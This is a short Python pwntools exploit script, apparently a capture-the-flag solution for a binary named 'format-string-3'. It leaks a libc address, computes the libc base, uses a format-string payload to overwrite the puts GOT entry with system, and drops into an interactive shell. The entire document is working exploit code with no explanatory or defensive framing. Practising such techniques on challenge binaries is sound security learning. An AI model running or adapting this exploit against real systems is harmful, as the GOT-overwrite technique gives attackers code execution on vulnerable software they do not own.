from pwn import *

context.binary = elf = ELF('./format-string-3', checksec=False)
libc = ELF('./libc.so.6',checksec=False)
p = process("./format-string-3")


leak = int(p.recvline_contains(b"0x").split()[-1], 16)
#print(hex(leak))

libc.address = leak - libc.sym.setvbuf
setvbuf_to_sys = int('0x2ac90', 16)

#log.info(f"libc base: {hex(libc.address)}")

#puts_got = int("elf.got['puts']", 16)
#print(hex(puts_got))

system_addr = libc.sym.system
puts_got = elf.got.puts

offset = 38

target = puts_got
value = system_addr

payload = fmtstr_payload(offset,{target:value},write_size="byte")
print(payload)
    
p.sendline(payload)

p.interactive()
